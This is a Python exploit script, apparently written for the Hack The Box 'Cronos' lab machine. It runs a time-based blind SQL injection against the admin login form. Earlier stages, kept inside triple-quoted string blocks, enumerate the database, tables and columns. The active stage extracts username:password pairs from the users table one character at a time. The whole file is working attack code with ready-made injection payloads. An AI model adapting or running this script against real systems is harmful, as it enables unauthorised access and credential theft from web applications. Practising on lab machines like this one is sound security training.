#!/usr/bin/python3

from pwn import *
import requests, string, time, signal


def def_handler(sig, frame):

	print("\n\n[!] Exiting...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global Variables
login_url = "http://admin.cronos.htb/"
payload = string.ascii_lowercase + string.digits + ":"

"""
#username brute force

def makeRequest():

	progressbar = log.progress("SQLI")
	progressbar.status("Starting the Brute Force attack...")
	progressbar2 = log.progress("Database")

	time.sleep(2)

	database = ""

	for position in range (1,10):
		for character in payload:
			
			post_data ={
				'username' : "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
				'password' : 'admin'
			}
			progressbar.status(post_data['username'])
			time_start = time.time()
			r = requests.post(login_url, data=post_data)
			time_end = time.time()
			
			if time_end - time_start > 5:
				database += character
				progressbar2.status(database)
				break
"""
"""
#table_name Brute Force

def makeRequest():

	progressbar = log.progress("SQLI")
	progressbar.status("Starting the Brute Force attack...")
	progressbar2 = log.progress("Tables")

	time.sleep(2)

	table_name = ""

	for table in range(0, 5):
		for position in range (1,10):
			for character in payload:
				
				post_data ={
					'username' : "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character),
					'password' : 'admin'
				}
				progressbar.status(post_data['username'])
				time_start = time.time()
				r = requests.post(login_url, data=post_data)
				time_end = time.time()
				
				if time_end - time_start > 5:
					table_name += character
					progressbar2.status(table_name)
					break
		table_name += ", "
"""
"""
#Columns Brute Force

def makeRequest():

	progressbar = log.progress("SQLI")
	progressbar.status("Starting the Brute Force attack...")
	progressbar2 = log.progress("Columns")

	time.sleep(2)

	column_name = ""

	for column in range(0, 5):
		for position in range (1,10):
			for character in payload:
				
				post_data ={
					'username' : "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (column, position, character),
					'password' : 'admin'
				}
				progressbar.status(post_data['username'])
				time_start = time.time()
				r = requests.post(login_url, data=post_data)
				time_end = time.time()
				
				if time_end - time_start > 5:
					column_name += character
					progressbar2.status(column_name)
					break
		column_name += ", "
"""

#Usernames and Passwords Brute Force

def makeRequest():

	progressbar = log.progress("SQLI")
	progressbar.status("Starting the Brute Force attack...")
	progressbar2 = log.progress("Data")

	time.sleep(2)

	data = ""

	for position in range (1,50):
		for character in payload:
			
			post_data ={
				'username' : "admin' and if(substr((select group_concat(username,':',password)from users),%d,1)='%c',sleep(3),1)-- -" % (position, character),
				'password' : 'admin'
			}
			progressbar.status(post_data['username'])
			time_start = time.time()
			r = requests.post(login_url, data=post_data)
			time_end = time.time()
			
			if time_end - time_start > 3:
				data += character
				progressbar2.status(data)
				break

if __name__ == '__main__':

	makeRequest()
